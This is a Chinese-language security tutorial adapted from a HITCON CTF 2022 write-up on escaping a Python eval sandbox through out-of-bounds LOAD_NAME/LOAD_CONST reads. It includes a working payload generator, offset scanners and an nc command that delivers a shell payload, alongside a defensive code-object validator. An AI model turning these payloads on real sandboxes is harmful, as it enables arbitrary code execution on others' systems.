# LOAD_NAME / LOAD_CONST opcode OOB Read

本页面改编自 Splitline 对 HITCON CTF 2022 "V O I D" 的原始 writeup 和 exploit chain。<sup>[[1]](#references)</sup>

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

`LOAD_NAME` 或 `LOAD_CONST` 的操作数可以读取刻意缩短的 `co_names` 或 `co_consts` tuple 之外的数据。在此 challenge 中，会使用不可达的 dummy names，直到附近的条目包含 `__getattribute__` 等有用的 attribute。<sup>[[1]](#references)</sup>

剩余的 payload 会复用该恢复出的 name 来构建 sandbox escape。<sup>[[1]](#references)</sup>

### 概述 <a href="#overview-1" id="overview-1"></a>

该 challenge wrapper 很短，并会在 evaluate 之前编译一个 expression：<sup>[[1]](#references)</sup>
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))
```
输入会被编译为 Python code object，然后 wrapper 会在调用 `eval` 前，将其 `co_consts` 和 `co_names` 替换为空 tuple。<sup>[[1]](#references)[[5]](#references)</sup>

任何仍会索引这些表的生成指令，都可能导致 interpreter 崩溃，或暴露相邻的 object pointer，具体取决于构建方式。<sup>[[1]](#references)</sup>

### Out of Bound Read <a href="#out-of-bound-read" id="out-of-bound-read"></a>

segfault 是如何发生的？

对于 `[a, b, c]` 这样的 list expression，compiler 会生成操作数连续的 `LOAD_NAME` 指令：<sup>[[1]](#references)[[2]](#references)</sup>
```
1           0 LOAD_NAME                0 (a)
2 LOAD_NAME                1 (b)
4 LOAD_NAME                2 (c)
6 BUILD_LIST               3
8 RETURN_VALUE
```
如果将 `co_names` 替换为 `()`，字节码仍然携带 `LOAD_NAME 2`；因此，未经检查的元组访问可能会获取元组之外的指针，而不是抛出 `IndexError`。<sup>[[1]](#references)[[3]](#references)</sup>

`LOAD_NAME` 和 `LOAD_CONST` 是这里的核心原语：它们的整数操作数分别选择 `co_names` 和 `co_consts` 中的条目。<sup>[[1]](#references)[[2]](#references)</sup>

在 CPython 的 dispatch 中，`LOAD_CONST` 获取选定的元组条目并将其压入栈中；release builds 使用未经检查的元组访问器：<sup>[[3]](#references)</sup>
```c
case TARGET(LOAD_CONST): {
PREDICTED(LOAD_CONST);
PyObject *value = GETITEM(consts, oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}
```
在目标 interpreter 上探测不断增加的 `LOAD_NAME` 操作数，以映射有用的条目。Splitline 在 challenge 环境中观察到 700 以上的有用偏移量，但布局取决于具体 build；可以使用 debugger 检查周围的内存。<sup>[[1]](#references)</sup>

### 生成 Exploit <a href="#generating-the-exploit" id="generating-the-exploit"></a>

一旦某个偏移量产生了有用的名称，就将越界查找放入不可达表达式中，并从可达的属性访问中引用同一个 `co_names` 槽位。<sup>[[1]](#references)</sup>

例如，如果偏移量 5 产生 `__getattribute__`，则将该名称保留在槽位 5 中，同时让 false 分支执行有用的查找：<sup>[[1]](#references)</sup>
```python
[a,b,c,d,e,__getattribute__] if [] else [
[].__getattribute__
# you can get the __getattribute__ method of list object now!
]
```
> 恢复出的文本不一定要是 `__getattribute__`；任何能够为 payload 提供作用的标识符都可以占据该位置。<sup>[[1]](#references)</sup>

正如反汇编所示，对于同一个名称的重复出现，编译器会重复使用 `co_names` 中的同一个槽位：<sup>[[1]](#references)[[2]](#references)</sup>
```python
0 BUILD_LIST               0
2 POP_JUMP_IF_FALSE       20
>>    4 LOAD_NAME                0 (a)
>>    6 LOAD_NAME                1 (b)
>>    8 LOAD_NAME                2 (c)
>>   10 LOAD_NAME                3 (d)
>>   12 LOAD_NAME                4 (e)
>>   14 LOAD_NAME                5 (__getattribute__)
16 BUILD_LIST               6
18 RETURN_VALUE
20 BUILD_LIST               0
>>   22 LOAD_ATTR                5 (__getattribute__)
24 BUILD_LIST               1
26 RETURN_VALUE
```
由于 `LOAD_ATTR` 也会通过 `co_names` 解析其名称，因此可达分支可以复用该槽位；较新 CPython 版本中的打包操作数在下面的版本说明中有所描述。<sup>[[1]](#references)[[2]](#references)</sup>

无需使用常量，即可通过布尔表达式构造小的非负整数：<sup>[[1]](#references)</sup>

- 0: not \[\[]]
- 1: not \[]
- 2: (not \[]) + (not \[])
- ...

### Exploit Script <a href="#exploit-script-1" id="exploit-script-1"></a>

原始 exploit 使用名称而非常量，以符合 challenge 的长度限制。<sup>[[1]](#references)</sup>

此 helper 通过构造一个空的 `co_names` tuple 来扫描候选名称偏移量。<sup>[[1]](#references)</sup>
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
def __getitem__(self, k):
if type(k) == str:
return k


if __name__ == '__main__':
n = int(argv[1])

code = [
*([opmap['EXTENDED_ARG'], n // 256]
if n // 256 != 0 else []),
opmap['LOAD_NAME'], n % 256,
opmap['RETURN_VALUE'], 0
]

c = CodeType(
0, 0, 0, 0, 0, 0,
bytes(code),
(), (), (), '<sandbox>', '<eval>', 0, b'', ()
)

ret = eval(c, {'__builtins__': MockBuiltins()})
if ret:
print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done
```
下面的 generator 将恢复的偏移量映射到名称，并生成源代码级别的 payload。<sup>[[1]](#references)</sup>
```python
import sys
import unicodedata


class Generator:
# get numner
def __call__(self, num):
if num == 0:
return '(not[[]])'
return '(' + ('(not[])+' * num)[:-1] + ')'

# get string
def __getattribute__(self, name):
try:
offset = None.__dir__().index(name)
return f'keys[{self(offset)}]'
except ValueError:
offset = None.__class__.__dir__(None.__class__).index(name)
return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
while True:
chr_code += 1
char = unicodedata.normalize('NFKC', chr(chr_code))
if char.isidentifier() and char not in names:
names.append(char)
break

offsets = {
"__delitem__": 2800,
"__getattribute__": 2850,
'__dir__': 4693,
'__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
names[offset] = name

for i, var in enumerate(variables):
assert var not in offsets
names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
get(get([],{_.__class__}),{_.__base__}),
{_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
从高层次来看，生成的 payload 获取函数的 globals，恢复 `builtins`，并调用 `eval(input())`。<sup>[[1]](#references)</sup>
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
getattr(
getattr(
[].__getattribute__('__class__'),
'__base__'),
'__subclasses__'
)()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
---

### 版本说明和受影响的 opcode（Python 3.11–3.13）

- 在 CPython 3.11–3.13 中，指令仍使用整数操作数来索引 code object 的 constant 和 name 表。如果任一元组短于被引用的索引，未经检查的访问可能会读取相邻的 object pointer，并导致崩溃或对其执行操作；具体行为取决于 interpreter build。<sup>[[2]](#references)[[3]](#references)</sup>
- `LOAD_CONST consti` 和（3.12+）`RETURN_CONST consti` 会读取 `co_consts[consti]`。<sup>[[2]](#references)</sup>
- 直接使用 name 表的指令包括 `LOAD_NAME`、`STORE_NAME`、`DELETE_NAME`、`STORE_GLOBAL`、`DELETE_GLOBAL`、`IMPORT_NAME`、`IMPORT_FROM`、`STORE_ATTR`、`DELETE_ATTR`，以及（3.12+）`LOAD_FROM_DICT_OR_GLOBALS`。<sup>[[2]](#references)</sup>
- `LOAD_GLOBAL namei` 和 `LOAD_ATTR namei` 使用 `co_names[namei >> 1]`；低位 bit 控制文档所述的 NULL/method 行为。（3.12+）`LOAD_SUPER_ATTR namei` 使用 `co_names[namei >> 2]`，并将两个 flag 打包到其低位中。<sup>[[2]](#references)</sup>
- Python 3.11+ 引入了 adaptive/inline cache，会在指令之间添加隐藏的 `CACHE` 条目。构建 `co_code` 时，手工编写的 bytecode 必须考虑这些条目。<sup>[[2]](#references)</sup>

实际影响是：bytecode 布局和恢复出的 offset 取决于具体 release 和 build。依赖该技术之前，请针对目标 CPython 版本测试该技术以及生成的 payload。<sup>[[2]](#references)</sup>

### 用于查找有用 OOB index 的快速 scanner（兼容 3.11+/3.12+）

如果你更倾向于直接从 bytecode 中探测有价值的 object，而不是从 high-level source 中探测，可以生成最小的 code object 并对 index 进行 brute-force。下面的 helper 会根据目标 interpreter 的 `dis` metadata 插入 inline cache。<sup>[[2]](#references)</sup>
```python
import dis, types

def assemble(ops):
# ops: list of (opname, arg) pairs
cache = bytes([dis.opmap.get("CACHE", 0), 0])
out = bytearray()
for op, arg in ops:
opc = dis.opmap[op]
out += bytes([opc, arg])
# Python >=3.11 inserts per-opcode inline cache entries
ncache = getattr(dis, "_inline_cache_entries", {}).get(opc, 0)
out += cache * ncache
return bytes(out)

# Reuse an existing function's code layout to simplify CodeType construction
base = (lambda: None).__code__

# Example: probe co_consts[i] with LOAD_CONST i and return it
# co_consts/co_names are intentionally empty so LOAD_* goes OOB

def probe_const(i):
code = assemble([
("RESUME", 0),          # 3.11+
("LOAD_CONST", i),
("RETURN_VALUE", 0),
])
c = base.replace(co_code=code, co_consts=(), co_names=())
try:
return eval(c)
except Exception:
return None

for idx in range(0, 300):
obj = probe_const(idx)
if obj is not None:
print(idx, type(obj), repr(obj)[:80])
```
注意事项
- 若要探测 names，请将 `LOAD_CONST` 替换为 `LOAD_NAME`/`LOAD_GLOBAL`/`LOAD_ATTR`，并根据目标 opcode 调整栈的使用方式和打包后的操作数。<sup>[[2]](#references)</sup>
- 如有需要，可使用 `EXTENDED_ARG` 或多个字节的 `arg` 来访问大于 255 的索引。此 helper 仅生成操作数的低位字节，因此较大的索引需要直接构造原始字节或执行多次加载。<sup>[[2]](#references)</sup>

### 仅使用 bytecode 的最小 RCE 模式（co_consts OOB → builtins → eval/input）

确定某个 `co_consts` 索引可解析为 builtins module 后，即可通过操作栈，在不使用 `co_names` 的情况下重构 `eval(input())`。官方 B01lers CTF 2024 的 `awpcode` 材料记录了同样的 OOB-read 模式。<sup>[[4]](#references)</sup>
```python
# Build co_code that:
# 1) LOAD_CONST <builtins_idx> → push builtins module
# 2) Use stack shuffles and BUILD_TUPLE/UNPACK_EX to peel strings like 'input'/'eval'
#    out of objects living nearby in memory (e.g., from method tables),
# 3) BINARY_SUBSCR to do builtins["input"] / builtins["eval"], CALL each, and RETURN_VALUE
# This pattern is the same idea as the high-level exploit above, but expressed in raw bytecode.
```
这种仅使用 stack 的方法适用于以下场景：challenge 让你直接控制 `co_code`，同时强制设置 `co_consts=()` 和 `co_names=()`；它避免了 source-level 技巧，并且可以通过使用 bytecode stack 操作和 tuple builders 来保持 payload 较小。<sup>[[4]](#references)</sup>

### 针对 sandbox 的防御性检查与缓解措施

如果你正在编写一个用于编译或执行不受信任代码的 Python sandbox，请不要依赖 CPython 对 bytecode 使用的 tuple 索引执行边界检查。在执行代码对象之前验证它们。<sup>[[2]](#references)[[3]](#references)</sup>

实用的 validator（拒绝对 co_consts/co_names 的 OOB 访问）。<sup>[[2]](#references)</sup>
```python
import dis

def max_name_index(code):
max_idx = -1
direct_name_ops = {
"LOAD_NAME", "STORE_NAME", "DELETE_NAME", "STORE_GLOBAL", "DELETE_GLOBAL",
"IMPORT_NAME", "IMPORT_FROM", "STORE_ATTR", "DELETE_ATTR",
"LOAD_FROM_DICT_OR_GLOBALS",
}
for ins in dis.get_instructions(code):
if ins.opname in direct_name_ops | {"LOAD_ATTR", "LOAD_GLOBAL", "LOAD_SUPER_ATTR"}:
namei = ins.arg or 0
# 3.11+: LOAD_ATTR/LOAD_GLOBAL pack one flag; LOAD_SUPER_ATTR packs two.
if ins.opname in {"LOAD_ATTR", "LOAD_GLOBAL"}:
namei >>= 1
elif ins.opname == "LOAD_SUPER_ATTR":
namei >>= 2
max_idx = max(max_idx, namei)
return max_idx

def max_const_index(code):
return max([ins.arg for ins in dis.get_instructions(code)
if ins.opname in {"LOAD_CONST", "RETURN_CONST"}] + [-1])

def validate_code_object(code: type((lambda:0).__code__)):
if max_const_index(code) >= len(code.co_consts):
raise ValueError("Bytecode refers to const index beyond co_consts length")
if max_name_index(code) >= len(code.co_names):
raise ValueError("Bytecode refers to name index beyond co_names length")

# Example use in a sandbox:
# src = input(); c = compile(src, '<sandbox>', 'exec')
# c = c.replace(co_consts=(), co_names=())       # if you really need this, validate first
# validate_code_object(c)
# eval(c, {'__builtins__': {}})
```
其他缓解措施建议
- 不要允许对不受信任的输入任意调用 `CodeType.replace(...)`，或对生成的 code object 添加严格的结构检查。
- 考虑在独立进程中运行不受信任的代码，并使用 OS-level sandboxing（seccomp、job objects、containers），而不是依赖 CPython 语义。

## References

- [1] [Splitline 的 HITCON CTF 2022 writeup “V O I D”（该技术及其高层 exploit chain 的来源）](https://blog.splitline.tw/hitcon-ctf-2022/)
- [2] [Python 3.13 `dis` documentation（bytecode indices、packed name operands 和 inline caches）](https://docs.python.org/3.13/library/dis.html)
- [3] [CPython 3.13.5 tuple-access macros（`GETITEM`）](https://github.com/python/cpython/blob/v3.13.5/Python/ceval_macros.h#L133-L143)
- [4] [B01lers CTF 2024 `awpcode` challenge writeup（CygnusX）](https://github.com/b01lers/b01lers-ctf-2024-public/tree/main/misc/awpcode)
- [5] [Python C API：Code Objects](https://docs.python.org/3/c-api/code.html)
{{#include ../../../banners/hacktricks-training.md}}
